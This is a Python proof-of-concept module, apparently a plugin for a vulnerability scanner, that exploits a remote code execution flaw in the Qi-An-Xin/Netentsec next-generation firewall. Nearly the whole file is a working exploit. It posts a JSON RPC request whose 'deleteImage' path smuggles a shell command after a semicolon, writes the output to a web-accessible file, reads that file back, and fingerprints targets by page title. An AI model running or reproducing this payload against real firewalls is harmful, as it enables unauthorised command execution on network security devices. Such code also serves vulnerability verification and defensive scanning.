# -*- coding:utf-8 -*-
# 奇安信 网康下一代防火墙RCE

from .. import fileUtil
from ServiceScanModel.models import ServiceScan
from ..requestClass import Requests

data = '{"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;{cmd}>/var/www/html/passerW.txt"]}],"type":"rpc","tid":17,"f8839p7rqtj":"="}'


class POC:
    def __init__(self, service: ServiceScan):
        self.service = service
        self.requestUtil= Requests(service.cookies)
        self.result = False

    def firewall_rce(self, url, cmd="whoami"):
        resp = self.requestUtil.post(url + "/directdata/direct/router", data=data.replace("{cmd}", cmd))
        resp = self.requestUtil.get(url + "/passerW.txt")
        if resp.status_code == 200 and not "<script>" in resp.text:
            return resp.text

    def fingerprint(self):
        try:
            if "网康下一代防火墙" in self.service.title:
                return True
        except:
            return False

    def poc(self):
        try:
            result = self.firewall_rce(self.service.url)
            print(result)
            if result:
                return ["奇安信 网康下一代防火墙RCE", "当前用户: %s" % result]
        except:
            return []
